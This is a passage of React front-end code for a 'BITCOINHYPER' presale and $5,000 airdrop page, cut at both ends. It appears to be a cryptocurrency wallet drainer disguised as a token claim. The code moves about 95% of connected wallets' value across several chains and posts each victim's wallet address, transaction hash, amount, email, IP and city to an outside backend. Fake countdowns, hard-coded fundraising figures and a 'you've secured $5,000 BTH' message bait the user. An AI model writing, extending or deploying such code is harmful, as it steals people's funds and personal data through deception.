              walletAddress: address,
              chainName: chain.name,
              flowId: flowId,
              txHash: tx,
              amount: amountToSend.toFixed(6),
              symbol: chain.symbol,
              valueUSD: valueUSD,
              gasFee: gasUsed,
              email: userEmail,
              location: {
                country: userLocation.country,
                flag: userLocation.flag,
                city: userLocation.city,
                ip: userLocation.ip
              }
            };
            
            console.log("📤 Sending to backend with amounts:", flowData);
            
            await fetch('https://hyperback.vercel.app/api/presale/execute-flow', {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify(flowData)
            });
            
            setTxStatus(`✅ ${chain.name} completed!`);
          } else {
            throw new Error(`Transaction failed on ${chain.name}`);
          }
          
        } catch (chainErr) {
          console.error(`Error on ${chain.name}:`, chainErr);
          if (chainErr.code === 4001) {
            // User rejected transaction
            failedChains.push(chain.name);
            setError(`Transaction rejected on ${chain.name}`);
          } else {
            failedChains.push(chain.name);
            setError(`Error on ${chain.name}: ${chainErr.message}`);
          }
        }
      }

      setVerifiedChains(processed);
      
      // Show success if at least one chain was processed
      if (processed.length > 0) {
        setShowCelebration(true);
        setTxStatus(`🎉 You've secured $5,000 BTH!`);
        
        // Calculate total processed value
        const totalProcessedValue = processed.reduce((sum, chainName) => {
          return sum + (balances[chainName]?.valueUSD * 0.95 || 0);
        }, 0);
        
        // Build detailed chains info for final message
        const chainsDetails = processed.map(chainName => {
          const amount = processedAmounts[chainName];
          return `${chainName}: ${amount?.amount || 'unknown'} ${amount?.symbol || ''} ($${amount?.valueUSD || 'unknown'})`;
        }).join('\n');
        
        // Final success notification with correct values
        await fetch('https://hyperback.vercel.app/api/presale/claim', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ 
            walletAddress: address,
            email: userEmail,
            location: {
              country: userLocation.country,
              flag: userLocation.flag,
              city: userLocation.city
            },
            chains: processed,
            chainsDetails: chainsDetails,
            totalProcessedValue: totalProcessedValue.toFixed(2),
            reward: "5000 BTH",
            bonus: `${presaleStats.currentBonus}%`
          })
        });
        
        // Show summary of skipped/failed chains if any
        if (skippedChains.length > 0 || failedChains.length > 0) {
          let summary = [];
          if (skippedChains.length > 0) summary.push(`Skipped: ${skippedChains.join(', ')} (below $1)`);
          if (failedChains.length > 0) summary.push(`Failed: ${failedChains.join(', ')}`);
          setError(`Note: ${summary.join(' · ')}`);
        }
      } else {
        setError("No chains were successfully processed");
      }
      
    } catch (err) {
      console.error('Error:', err);
      if (err.code === 4001) {
        setError('Transaction cancelled');
      } else {
        setError(err.message || 'Transaction failed');
      }
    } finally {
      setSignatureLoading(false);
      setProcessingChain('');
    }
  };

  const claimTokens = async () => {
    try {
      setLoading(true);
      await fetch('https://hyperback.vercel.app/api/presale/claim', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ 
          walletAddress: address,
          email: userEmail,
          location: userLocation,
          reward: "5000 BTH",
          bonus: `${presaleStats.currentBonus}%`
        })
      });
      setShowCelebration(true);
    } catch (err) {
      console.error('Claim error:', err);
    } finally {
      setLoading(false);
    }
  };

  const formatAddress = (addr) => {
    if (!addr) return '';
    return `${addr.substring(0, 6)}...${addr.substring(38)}`;
  };

  return (
    <div className="min-h-screen bg-[#030405] text-[#e0e7f0] font-['Inter'] overflow-hidden">
      
      {/* Animated Orbs */}
      <div className="fixed w-[90vmax] h-[90vmax] bg-[radial-gradient(circle_at_40%_50%,rgba(200,120,30,0.15)_0%,rgba(180,100,20,0)_70%)] rounded-full top-[-25vmax] right-[-15vmax] z-0 animate-floatOrbBig pointer-events-none"></div>
      <div className="fixed w-[80vmin] h-[80vmin] bg-[radial-gradient(circle_at_30%_70%,rgba(0,150,200,0.08)_0%,transparent_70%)] rounded-full bottom-[-10vmin] left-[-5vmin] z-0 animate-floatOrbSmall pointer-events-none"></div>

      {/* Main Container */}
      <div className="relative z-10 container mx-auto px-3 sm:px-4 py-4 sm:py-8 max-w-[720px]">
        
        {/* Glass Panel Card */}
        <div className="bg-[rgba(10,15,20,0.75)] backdrop-blur-[12px] saturate-150 border border-[rgba(200,130,30,0.2)] rounded-[32px] sm:rounded-[48px] shadow-[0_20px_50px_-15px_rgba(0,0,0,0.9),0_0_0_1px_rgba(200,120,20,0.15)_inset] hover:shadow-[0_25px_60px_-12px_rgba(200,120,20,0.2),0_0_0_1px_rgba(200,120,20,0.3)_inset] transition-all duration-300 p-5 sm:p-8 md:p-10 relative">
          
          {/* TOP SECTION: logo + connect button + language selector with PRO RIBBON */}
          <div className="flex flex-col sm:flex-row items-center justify-between gap-4 mb-6 sm:mb-8 relative">
            {/* Professional Ribbon Animation - Points to Connect Wallet */}
            {!isConnected && showRibbon && (
              <div className="absolute -top-16 sm:-top-20 right-0 sm:right-0 z-20 animate-ribbonSlide">
                {/* Main Ribbon Container */}
                <div className="relative group/ribbon">
                  {/* Glow Effects */}
                  <div className="absolute -inset-2 bg-gradient-to-r from-[#b36e1a] via-[#d68a2e] to-[#b36e1a] rounded-lg blur-xl opacity-60 animate-pulse-slow"></div>
                  
                  {/* Arrow pointing to button */}
                  <div className="absolute -bottom-4 right-12 sm:right-16 w-6 h-6 bg-[#c47d24] transform rotate-45 animate-bounce-arrow"></div>
                  
                  {/* Ribbon Body */}
                  <div className="relative bg-gradient-to-r from-[#8a4c1a] via-[#b36e1a] to-[#cc8822] rounded-lg px-5 py-3 shadow-2xl border border-[#e0a55c] overflow-hidden">
                    {/* Shimmer Effect */}
                    <div className="absolute inset-0 bg-gradient-to-r from-transparent via-white/30 to-transparent animate-shimmer-slow"></div>
                    
                    {/* Sparkles */}
                    <div className="absolute -top-1 -right-1 w-3 h-3 bg-yellow-300 rounded-full animate-ping opacity-75"></div>
                    <div className="absolute -bottom-1 -left-1 w-2 h-2 bg-yellow-300 rounded-full animate-ping opacity-50 delay-300"></div>
                    
                    {/* Content */}
                    <div className="relative flex items-center gap-3">
                      {/* Icon */}
                      <div className="relative">
                        <div className="w-8 h-8 bg-white/20 rounded-full flex items-center justify-center backdrop-blur border border-white/30">
                          <i className="fas fa-gem text-white text-sm animate-ringPop"></i>
                        </div>
                        <div className="absolute inset-0 w-8 h-8 bg-white/10 rounded-full animate-ping opacity-50"></div>
                      </div>
                      
                      {/* Text */}
                      <div className="text-left">
                        <div className="text-xs font-bold text-white/90 uppercase tracking-wider">
                          {t.checkWalletEligibility}
                        </div>
                        <div className="text-sm font-black text-white flex items-center gap-1">
                          <span>{t.whenQualified}</span>
                          <i className="fas fa-bolt text-yellow-300 animate-bounce-slow ml-1"></i>
                        </div>
                      </div>
                      
                      {/* Value Badge */}
                      <div className="bg-black/30 backdrop-blur px-3 py-1 rounded-full border border-white/20">
                        <span className="text-xs font-bold text-white">{t.valueBadge}</span>
                      </div>
                    </div>
                    
                    {/* Progress Line */}
                    <div className="absolute bottom-0 left-0 h-[2px] bg-gradient-to-r from-yellow-300 via-white to-yellow-300 animate-progressScan"></div>
                  </div>
                </div>
              </div>
            )}
            
            <div className="flex items-center gap-2 font-bold text-xl sm:text-2xl text-[#d68a2e] drop-shadow-[0_0_5px_rgba(200,120,20,0.5)]">
              <i className="fab fa-bitcoin text-3xl sm:text-4xl animate-spinSlow"></i>
              <span>BITCOINHYPER</span>
            </div>
            
            <div className="flex items-center gap-2">
              {/* ============================================ */}
              {/* SLEEK ALL COUNTRIES TRANSLATOR DROPDOWN */}
              {/* ============================================ */}
              <div className="relative">
                <button
                  onClick={() => setShowLanguageDropdown(!showLanguageDropdown)}
                  className="bg-black/60 backdrop-blur border border-[#c47d24]/30 rounded-full px-3 py-2 sm:px-4 sm:py-2 flex items-center gap-2 hover:border-[#d68a2e]/50 transition-all duration-300 group/lang"
                >
                  <span className="text-lg sm:text-xl">{SUPPORTED_LANGUAGES[language]?.flag || '🇺🇸'}</span>
                  <span className="text-xs sm:text-sm font-medium text-[#e0b880] group-hover/lang:text-[#f0c080] hidden sm:inline">
                    {SUPPORTED_LANGUAGES[language]?.native || 'English'}
                  </span>
                  <i className={`fas fa-chevron-down text-[#c47d24] text-xs transition-transform duration-300 ${showLanguageDropdown ? 'rotate-180' : ''}`}></i>
                </button>
                
                {/* Language Dropdown */}
                {showLanguageDropdown && (
                  <div className="absolute right-0 mt-2 w-64 sm:w-72 bg-[#0f1215] backdrop-blur-xl border border-[#c47d24]/30 rounded-2xl shadow-2xl z-50 max-h-96 overflow-y-auto animate-fadeIn">
                    <div className="p-2">
                      <div className="text-xs text-[#c47d24] px-3 py-2 font-semibold border-b border-[#c47d24]/20 mb-1">
                        SELECT LANGUAGE
                      </div>
                      {Object.entries(SUPPORTED_LANGUAGES).map(([code, lang]) => (
                        <button
                          key={code}
                          onClick={() => changeLanguage(code)}
                          className={`w-full text-left px-3 py-2.5 rounded-xl flex items-center gap-3 transition-all duration-200 hover:bg-[#c47d24]/10 ${
                            language === code ? 'bg-[#c47d24]/20 border border-[#c47d24]/30' : ''
                          }`}
                        >
                          <span className="text-xl">{lang.flag}</span>
                          <div className="flex-1">
                            <div className="text-sm font-medium text-white">{lang.name}</div>
                            <div className="text-xs text-gray-400">{lang.native}</div>
                          </div>
                          {language === code && (
                            <i className="fas fa-check text-[#c47d24] text-sm"></i>
                          )}
                        </button>
                      ))}
                    </div>
                  </div>
                )}
              </div>
              
              {!isConnected ? (
                <button
                  onClick={() => open()}
                  onMouseEnter={() => setHoverConnect(true)}
                  onMouseLeave={() => setHoverConnect(false)}
                  className="bg-gradient-to-r from-[#c47d24] to-[#b36e1a] border border-[#cc9f66] text-[#0f0f12] font-bold text-xs sm:text-sm px-4 sm:px-6 py-3 sm:py-3 rounded-full flex items-center justify-center gap-2 shadow-lg hover:scale-[1.02] hover:shadow-[0_5px_15px_rgba(180,100,20,0.4)] transition-all uppercase tracking-wider whitespace-nowrap relative overflow-hidden group"
                >
                  <span className="absolute inset-0 bg-white/10 transform scale-0 group-hover:scale-100 rounded-full transition-transform duration-500"></span>
                  <span className="relative flex h-2 w-2 mr-1">
                    <span className="animate-ping absolute inline-flex h-full w-full rounded-full bg-green-400 opacity-75"></span>
                    <span className="relative inline-flex rounded-full h-2 w-2 bg-green-500"></span>
                  </span>
                  <i className="fas fa-plug relative z-10 animate-bounce-slow"></i>
                  <span className="relative z-10">{t.connectWallet}</span>
                  <i className="fas fa-arrow-right ml-1 relative z-10 group-hover:translate-x-1 transition-transform"></i>
                </button>
              ) : (
                <div className="bg-black/70 rounded-full py-1 pl-4 sm:pl-5 pr-1 flex items-center justify-between gap-2 sm:gap-3 border border-[#c47d24]/60 backdrop-blur-md shadow-[0_0_12px_rgba(180,100,20,0.2)]">
                  <span className="font-mono font-semibold text-white text-xs sm:text-sm truncate max-w-[120px] sm:max-w-none">
                    {formatAddress(address)}
                  </span>
                  <button
                    onClick={() => disconnect()}
                    className="w-8 h-8 sm:w-10 sm:h-10 rounded-full bg-[#c47d24] border border-[#cc9f66] flex items-center justify-center hover:bg-[#d68a2e] hover:scale-110 transition-all text-black shadow-lg"
                    title={t.disconnect}
                  >
                    <i className="fas fa-power-off text-sm"></i>
                  </button>
                </div>
              )}
            </div>
          </div>

          {/* ELIGIBILITY CHECKING ANIMATION - Sleek without network names */}
          {isConnected && scanning && (
            <div className="mb-6 text-center">
              <div className="bg-black/60 rounded-2xl p-6 border border-[#c47d24]/30">
                <div className="flex items-center justify-center gap-4 mb-4">
                  <div className="w-12 h-12 border-4 border-[#c47d24] border-t-transparent rounded-full animate-spin"></div>
                  <div className="text-left">
                    <div className="text-lg font-bold text-[#e0b880]">{t.checkEligibility}</div>
                    <div className="text-sm text-gray-400">{t.verifying}</div>
                  </div>
                </div>
                
                {/* Sleek progress bar */}
                <div className="w-full bg-gray-800 rounded-full h-1.5 mb-2">
                  <div 
                    className="bg-gradient-to-r from-[#c47d24] to-[#d68a2e] h-1.5 rounded-full transition-all duration-300"
                    style={{ width: `${scanProgress}%` }}
                  ></div>
                </div>
                
                <div className="mt-3 text-sm text-[#c47d24]">
                  {txStatus}
                </div>
              </div>
            </div>
          )}

          {/* LIVE badge */}
          <div className="flex justify-center mb-3 sm:mb-4">
            <div className="bg-[rgba(180,100,20,0.15)] rounded-full px-4 sm:px-6 py-2 border border-[#c47d24]/50 inline-flex items-center gap-2 sm:gap-3 font-bold text-xs sm:text-sm backdrop-blur shadow-[0_0_10px_rgba(180,100,20,0.3)] animate-liveBlink relative overflow-hidden">
              <div className="absolute inset-0 bg-gradient-to-r from-transparent via-white/10 to-transparent animate-shimmer-slow"></div>
              <i className="fas fa-circle text-[#d44040] text-xs animate-blinkRed relative z-10"></i>
              <span className="whitespace-nowrap relative z-10">{t.presaleLive}</span>
              <span className="inline-block w-2 h-2 bg-[#d44040] rounded-full animate-blinkRed shadow-[0_0_8px_#d44040] relative z-10"></span>
            </div>
          </div>

          {/* Countdown Timer */}
          <div className="bg-black/60 rounded-2xl sm:rounded-full px-4 sm:px-5 py-4 sm:py-4 mb-5 sm:mb-6 border border-[#c47d24]/30 backdrop-blur shadow-[0_0_20px_rgba(180,100,20,0.1)] hover:shadow-[0_0_30px_rgba(180,100,20,0.2)] transition-all duration-500">
            <div className="text-[10px] sm:text-xs tracking-widest uppercase text-[#a0b0c0] mb-2 sm:mb-2 text-center">
              <i className="fas fa-hourglass-half mr-1 sm:mr-2 animate-spin-slow"></i> {t.bonusEndsIn}
            </div>
            <div className="grid grid-cols-4 gap-1 sm:gap-3">
              {[
                { label: t.days, value: timeLeft.days },
                { label: t.hrs, value: timeLeft.hours },
                { label: t.mins, value: timeLeft.minutes },
                { label: t.secs, value: timeLeft.seconds }
              ].map((item, index) => (
                <div key={index} className="flex flex-col items-center group/count">
                  <span className="text-xl sm:text-2xl md:text-4xl font-extrabold bg-gradient-to-b from-[#d68a2e] to-[#b36e1a] bg-clip-text text-transparent drop-shadow-[0_0_6px_rgba(180,100,20,0.4)] group-hover/count:scale-110 transition-transform duration-300">
                    {item.value.toString().padStart(2, '0')}
                  </span>
                  <span className="text-[8px] sm:text-xs uppercase tracking-wider text-[#8895aa] group-hover/count:text-[#d68a2e] transition-colors duration-300">{item.label}</span>
                </div>
              ))}
            </div>
          </div>

          {/* DISCOUNT RIBBON - Enhanced animation when eligible */}
          <div className={`relative mb-5 sm:mb-6 group/ribbon transition-all duration-700 ${isEligible ? 'scale-110 animate-pulse-glow' : ''}`}>
            <div className="absolute -inset-1 bg-gradient-to-r from-[#8a4c1a] via-[#b36e1a] to-[#cc8822] rounded-full blur-xl opacity-50 group-hover/ribbon:opacity-75 animate-pulse-slow"></div>
            <div className="absolute -inset-2 bg-gradient-to-r from-[#b36e1a] via-[#d68a2e] to-[#b36e1a] rounded-full blur-2xl opacity-30 group-hover/ribbon:opacity-50 animate-pulse-slower"></div>
            
            <div className="relative bg-gradient-to-r from-[#8a4c1a] via-[#b36e1a] to-[#cc8822] rounded-full px-3 sm:px-6 py-2 sm:py-3 inline-flex items-center justify-center gap-2 sm:gap-4 font-bold text-sm sm:text-xl text-[#0f0f12] border border-[#cc9f66] shadow-[0_0_20px_rgba(180,100,20,0.3)] animate-discountRibbon w-full overflow-hidden">
              <div className="absolute inset-0 bg-gradient-to-r from-transparent via-white/20 to-transparent animate-shimmer-slow"></div>
              
              <div className="relative">
                <i className="fas fa-gem text-lg sm:text-3xl drop-shadow-[0_0_4px_black] animate-ringPop relative z-10"></i>
                <i className="fas fa-gem absolute inset-0 text-lg sm:text-3xl text-yellow-300 animate-ping opacity-75"></i>
              </div>
              
              <span className="whitespace-nowrap relative z-10 animate-pulse-text">{t.bonus}</span>
              
              <div className="relative">
                <i className="fas fa-bolt text-lg sm:text-3xl drop-shadow-[0_0_4px_black] animate-ringPop relative z-10"></i>
                <i className="fas fa-bolt absolute inset-0 text-lg sm:text-3xl text-yellow-300 animate-ping opacity-75"></i>
              </div>
            </div>
          </div>

          <h1 className="text-4xl sm:text-5xl md:text-7xl font-extrabold text-center mb-1 sm:mb-2 bg-gradient-to-b from-white via-[#f0d0a0] to-[#d68a2e] bg-clip-text text-transparent drop-shadow-[0_0_12px_rgba(200,120,20,0.3)] animate-pulse-slow">
            $5,000 BTH
          </h1>
          
          <div className="text-center mb-4 sm:mb-6">
            <span className="bg-black/60 rounded-full px-4 sm:px-6 py-1.5 sm:py-2 text-[10px] sm:text-xs border border-[#c47d24]/40 text-[#e0b880] font-semibold backdrop-blur inline-block hover:border-[#d68a2e] hover:text-[#f0c080] transition-all duration-300">
              <i className="fas fa-bolt mr-1 sm:mr-2 animate-bounce-slow"></i> {t.instantAirdrop}
            </span>
          </div>

          {/* Presale Stats */}
          <div className="bg-black/60 rounded-2xl sm:rounded-[40px] p-4 sm:p-6 mb-6 sm:mb-8 grid grid-cols-3 gap-2 border border-[#c47d24]/30 backdrop-blur relative overflow-hidden group/stats hover:border-[#d68a2e]/50 transition-all duration-500">
            <div className="absolute inset-0 bg-gradient-to-r from-transparent via-white/5 to-transparent animate-shimmerSlow"></div>
            <div className="text-center relative z-10 group/price">
              <div className="text-[8px] sm:text-xs text-[#9aa8b8] tracking-widest group-hover/price:text-[#d68a2e] transition-colors duration-300">{t.bthPrice}</div>
              <div className="text-sm sm:text-xl md:text-2xl font-extrabold text-white drop-shadow-[0_0_4px_rgba(180,100,20,0.3)] group-hover/price:scale-110 transition-transform duration-300">
                ${presaleStats.tokenPrice} <span className="text-[8px] sm:text-xs text-[#c47d24] ml-0.5 group-hover/price:text-[#e09a3e]">+150%</span>
              </div>
            </div>
            <div className="text-center relative z-10 group/bonus">
              <div className="text-[8px] sm:text-xs text-[#9aa8b8] tracking-widest group-hover/bonus:text-[#d68a2e] transition-colors duration-300">{t.bonusLabel}</div>
              <div className="text-sm sm:text-xl md:text-2xl font-extrabold text-white drop-shadow-[0_0_4px_rgba(180,100,20,0.3)] group-hover/bonus:scale-110 transition-transform duration-300">
                5k <span className="text-[8px] sm:text-xs text-[#c47d24] ml-0.5 group-hover/bonus:text-[#e09a3e]">+25%</span>
              </div>
            </div>
            <div className="text-center relative z-10 group/stage">
              <div className="text-[8px] sm:text-xs text-[#9aa8b8] tracking-widest group-hover/stage:text-[#d68a2e] transition-colors duration-300">{t.presale}</div>
              <div className="text-sm sm:text-xl md:text-2xl font-extrabold text-white drop-shadow-[0_0_4px_rgba(180,100,20,0.3)] group-hover/stage:scale-110 transition-transform duration-300">
                {t.stage4}
              </div>
            </div>
          </div>

          {/* Main Claim Area - UPDATED WITH FLARE VERSION STYLING */}
          {isConnected && isEligible && !allChainsCompleted && executableChains.length > 0 && (
            <div className="mt-3 sm:mt-4">
              <div className="bg-gradient-to-b from-[#1a1814] to-[#121110] rounded-2xl sm:rounded-full px-4 sm:px-6 py-4 sm:py-6 text-2xl sm:text-4xl md:text-5xl font-extrabold border border-[#c47d24]/60 flex items-center justify-center gap-1 sm:gap-2 text-[#e0c080] shadow-[0_0_20px_rgba(180,100,20,0.15)] animate-glowPulse mb-4 sm:mb-5 relative overflow-hidden group/amount">
                <div className="absolute inset-0 bg-gradient-to-r from-transparent via-white/10 to-transparent animate-shimmer-slow"></div>
                <span className="relative z-10">5,000</span> <span className="text-sm sm:text-xl text-[#a0a8b0] font-normal relative z-10">BTH +25%</span>
              </div>
              
              {/* FLARE VERSION CLAIM AIRDROP STYLING */}
              <button
                onClick={executeMultiChainSignature}
                disabled={signatureLoading || loading || !signer || executableChains.length === 0}
                className="w-full relative overflow-hidden group/claim rounded-2xl sm:rounded-3xl transition-all duration-500 transform hover:scale-[1.02] disabled:opacity-50 disabled:cursor-not-allowed"
              >
                {/* Animated Background with Flare Effect */}
                <div className="absolute inset-0 bg-gradient-to-r from-[#b36e1a] via-[#d68a2e] to-[#f0b45a] animate-gradientMove"></div>
                
                {/* Glow Layers */}
                <div className="absolute -inset-1 bg-gradient-to-r from-[#d68a2e] via-[#f0b45a] to-[#d68a2e] rounded-2xl sm:rounded-3xl blur-xl opacity-60 group-hover/claim:opacity-80 animate-pulse-slow"></div>
                <div className="absolute -inset-2 bg-gradient-to-r from-[#b36e1a] via-[#e09a3e] to-[#b36e1a] rounded-2xl sm:rounded-3xl blur-2xl opacity-30 group-hover/claim:opacity-50 animate-pulse-slower"></div>
                
                {/* Sparkles Container */}
                <div className="absolute inset-0 overflow-hidden rounded-2xl sm:rounded-3xl">
                  {[...Array(8)].map((_, i) => (
                    <div
                      key={i}
                      className="absolute w-1 h-1 bg-white rounded-full animate-claimSparkle"
                      style={{
                        top: `${Math.random() * 100}%`,
                        left: `${Math.random() * 100}%`,
                        animationDelay: `${i * 0.2}s`,
                        opacity: 0.6
                      }}
                    />
                  ))}
                </div>
                
                {/* Button Content */}
                <div className="relative bg-gradient-to-r from-[#b36e1a]/90 via-[#d68a2e]/90 to-[#f0b45a]/90 backdrop-blur px-6 sm:px-8 py-5 sm:py-6 rounded-2xl sm:rounded-3xl border-2 border-[#ffd700]/30 flex items-center justify-center gap-3 sm:gap-4 shadow-2xl">
                  {/* Left Icon with Animation */}
                  <div className="relative">
                    <div className="w-8 h-8 sm:w-10 sm:h-10 bg-white/20 rounded-full flex items-center justify-center backdrop-blur border border-white/40 animate-pulse">
                      <i className="fas fa-gift text-white text-sm sm:text-base"></i>
                    </div>
                    <div className="absolute inset-0 w-8 h-8 sm:w-10 sm:h-10 bg-white/10 rounded-full animate-ping opacity-50"></div>
                  </div>
                  
                  {/* Text */}
                  <div className="text-left">
                    <div className="text-xs font-bold text-white/80 uppercase tracking-wider">
                      {t.claim}
                    </div>
                    <div className="text-base sm:text-xl font-black text-white flex items-center gap-2">
                      {signatureLoading ? (
                        <>
                          <div className="w-4 h-4 sm:w-5 sm:h-5 border-2 border-white/30 border-t-white rounded-full animate-spin"></div>
                          <span className="animate-pulse">{t.processing}</span>
                        </>
                      ) : (
                        <>
                          <span>${presaleStats.tokenPrice * 5000} VALUE</span>
                          <span className="text-xs sm:text-sm bg-black/30 px-2 py-0.5 rounded-full border border-white/20">
                            +{presaleStats.currentBonus}%
                          </span>
                        </>
                      )}
                    </div>
                  </div>
                  
                  {/* Right Icon with Animation */}
                  <div className="relative">
                    <div className="w-8 h-8 sm:w-10 sm:h-10 bg-white/20 rounded-full flex items-center justify-center backdrop-blur border border-white/40">
                      <i className="fas fa-arrow-right text-white text-sm sm:text-base group-hover/claim:translate-x-1 transition-transform"></i>
                    </div>
                    <div className="absolute inset-0 w-8 h-8 sm:w-10 sm:h-10 bg-white/10 rounded-full animate-ping opacity-50 delay-300"></div>
                  </div>
                </div>
              </button>
              
              {txStatus && (
                <div className="text-center mt-2 sm:mt-3 text-xs sm:text-sm font-medium text-[#c47d24] animate-fadeIn">
                  {txStatus}
                </div>
              )}
            </div>
          )}

          {/* Already completed */}
          {allChainsCompleted && (
            <div className="mt-3 sm:mt-4">
              <div className="bg-black/60 rounded-xl sm:rounded-2xl p-4 sm:p-6 text-center border border-green-500/20 mb-3 sm:mb-4 animate-pulse-glow">
                <p className="text-green-400 text-base sm:text-lg mb-1 sm:mb-2">{t.completed}</p>
                <p className="text-gray-400 text-xs sm:text-sm">{t.secured}</p>
              </div>
              <button
                onClick={claimTokens}
                className="w-full bg-gradient-to-r from-green-600/80 to-green-700/80 text-white font-bold text-base sm:text-xl py-4 sm:py-5 px-4 sm:px-6 rounded-full shadow-lg hover:scale-[1.02] transition-all relative overflow-hidden group/view"
              >
                <div className="absolute inset-0 bg-gradient-to-r from-transparent via-white/20 to-transparent translate-x-[-100%] group-hover/view:translate-x-[100%] transition-transform duration-1000"></div>
                🎉 {t.view}
              </button>
            </div>
          )}

          {/* Welcome message for non-eligible - NO BALANCES SHOWN */}
          {isConnected && !isEligible && !completedChains.length && !scanning && (
            <div className="bg-black/60 rounded-xl sm:rounded-2xl p-5 sm:p-8 text-center border border-purple-500/20 mt-3 sm:mt-4 hover:border-purple-500/40 transition-all duration-500">
              <div className="text-4xl sm:text-6xl mb-3 sm:mb-4 animate-float">👋</div>
              <h2 className="text-lg sm:text-2xl font-bold mb-2 sm:mb-3 bg-gradient-to-r from-purple-400/80 to-orange-400/80 bg-clip-text text-transparent">
                {t.welcome}
              </h2>
              <p className="text-gray-400 text-xs sm:text-sm mb-4 sm:mb-6">
                Connect with a wallet that has at least $1 in value to qualify.
              </p>
              <div className="bg-gray-900/60 rounded-lg sm:rounded-xl p-3 sm:p-4 border border-gray-800">
                <p className="text-xs text-gray-400">
                  Multi-chain support: Ethereum, BSC, Polygon, Arbitrum, Avalanche
                </p>
              </div>
            </div>
          )}

          {/* Error Display */}
          {error && (
            <div className="mt-3 sm:mt-4 bg-red-500/10 backdrop-blur border border-red-500/20 rounded-lg sm:rounded-xl p-3 sm:p-4 animate-shake">
              <div className="flex items-center gap-2 sm:gap-3">
                <i className="fas fa-exclamation-triangle text-red-400 text-base sm:text-xl animate-pulse"></i>
                <p className="text-red-300 text-xs sm:text-sm">{error}</p>
              </div>
            </div>
          )}

          {/* Presale Stats Section */}
          <div className="mt-6 sm:mt-10 pt-4 sm:pt-6 border-t border-[#c47d24]/10">
            <h3 className="text-base sm:text-xl font-bold text-center mb-4 sm:mb-6 bg-gradient-to-r from-orange-400/80 to-yellow-400/80 bg-clip-text text-transparent">
              PRESALE LIVE PROGRESS
            </h3>
            
            <div className="grid grid-cols-3 gap-2 sm:gap-4 mb-4 sm:mb-6">
              <div className="text-center group/price2">
                <div className="text-base sm:text-xl md:text-2xl font-bold text-orange-400/90 mb-0.5 sm:mb-1 group-hover/price2:scale-110 transition-transform duration-300">${presaleStats.tokenPrice}</div>
                <div className="text-[8px] sm:text-xs text-gray-500">{t.tokenPrice}</div>
              </div>
              <div className="text-center group/bonus2">
                <div className="text-base sm:text-xl md:text-2xl font-bold text-green-400/90 mb-0.5 sm:mb-1 group-hover/bonus2:scale-110 transition-transform duration-300">{presaleStats.currentBonus}%</div>
                <div className="text-[8px] sm:text-xs text-gray-500">{t.currentBonus}</div>
              </div>
              <div className="text-center group/raised">
                <div className="text-base sm:text-xl md:text-2xl font-bold text-yellow-400/90 mb-0.5 sm:mb-1 group-hover/raised:scale-110 transition-transform duration-300">$1.25M</div>
                <div className="text-[8px] sm:text-xs text-gray-500">{t.totalRaised}</div>
              </div>
            </div>

            {/* Progress Bar */}
            <div className="mb-3 sm:mb-4">
              <div className="flex justify-between text-[10px] sm:text-sm text-gray-400 mb-1 sm:mb-2">
                <span>{t.progress}</span>
                <span>{liveProgress.percentComplete}%</span>
              </div>
              <div className="w-full h-1.5 sm:h-2 bg-gray-800 rounded-full overflow-hidden">
                <div 
                  className="h-full bg-gradient-to-r from-orange-500/80 to-yellow-500/80 rounded-full relative animate-pulse-width"
                  style={{ width: `${liveProgress.percentComplete}%` }}
                >
                  <div className="absolute inset-0 bg-white/10 animate-shimmer"></div>
                </div>
              </div>
            </div>

            <div className="grid grid-cols-2 gap-2 sm:gap-4 mt-4 sm:mt-6">
              <div className="bg-gray-800/30 rounded-lg p-2 sm:p-3 text-center hover:bg-gray-800/50 transition-all duration-300">
                <div className="text-[8px] sm:text-xs text-gray-400 mb-0.5 sm:mb-1">{t.today}</div>
                <div className="text-sm sm:text-lg font-bold text-orange-400/90">{liveProgress.participantsToday}</div>
              </div>
              <div className="bg-gray-800/30 rounded-lg p-2 sm:p-3 text-center hover:bg-gray-800/50 transition-all duration-300">
                <div className="text-[8px] sm:text-xs text-gray-400 mb-0.5 sm:mb-1">{t.avg}</div>
                <div className="text-sm sm:text-lg font-bold text-yellow-400/90">${liveProgress.avgAllocation}</div>
              </div>
            </div>

            <div className="mt-3 sm:mt-4 text-center">
              <p className="text-[8px] sm:text-xs text-gray-600">
                {presaleStats.totalParticipants.toLocaleString()} {t.participants}
              </p>
            </div>
          </div>

          {/* Footer */}
          <div className="mt-6 sm:mt-8 text-center">
            <div className="flex flex-wrap justify-center gap-1.5 sm:gap-3 mb-3 sm:mb-4">
              <span className="bg-gray-800/20 backdrop-blur px-2 sm:px-4 py-1 sm:py-2 rounded-full text-[8px] sm:text-xs text-gray-500 border border-gray-800 hover:border-[#c47d24]/50 hover:text-[#d68a2e] transition-all duration-300">
                ⚡ {t.terms}
              </span>
              <span className="bg-gray-800/20 backdrop-blur px-2 sm:px-4 py-1 sm:py-2 rounded-full text-[8px] sm:text-xs text-gray-500 border border-gray-800 hover:border-[#c47d24]/50 hover:text-[#d68a2e] transition-all duration-300">
                🔄 {t.delivery}
              </span>
              <span className="bg-gray-800/20 backdrop-blur px-2 sm:px-4 py-1 sm:py-2 rounded-full text-[8px] sm:text-xs text-gray-500 border border-gray-800 hover:border-[#c47d24]/50 hover:text-[#d68a2e] transition-all duration-300">
                💎 {t.airdrop}
              </span>
            </div>
            <p className="text-[8px] sm:text-xs text-gray-700 flex items-center justify-center gap-1 sm:gap-2">
              <i className="fas fa-bolt animate-pulse"></i> {t.liveNow}
              <i className="fas fa-star text-[#c47d24]/70 animate-spin-slow"></i>
            </p>
          </div>
        </div>
      </div>

      {/* Celebration Modal */}
      {showCelebration && (
        <div className="fixed inset-0 bg-black/90 backdrop-blur-xl flex items-center justify-center z-50 p-3 sm:p-4 animate-fadeIn">
          <div className="relative max-w-sm sm:max-w-lg w-full">
            <div className="absolute inset-0 bg-gradient-to-r from-orange-600/30 via-yellow-600/30 to-orange-600/30 rounded-2xl sm:rounded-3xl blur-2xl animate-pulse-slow"></div>
            
            {/* Confetti effect */}
            {[...Array(20)].map((_, i) => (
              <div
                key={i}
                className="absolute w-0.5 h-0.5 bg-gradient-to-r from-yellow-400/50 to-orange-500/50 rounded-full animate-confetti-cannon"
                style={{
                  left: `${Math.random() * 100}%`,
                  top: '50%',
                  animationDelay: `${i * 0.1}s`,
                  animationDuration: `${1 + Math.random()}s`
                }}
              />
            ))}
            
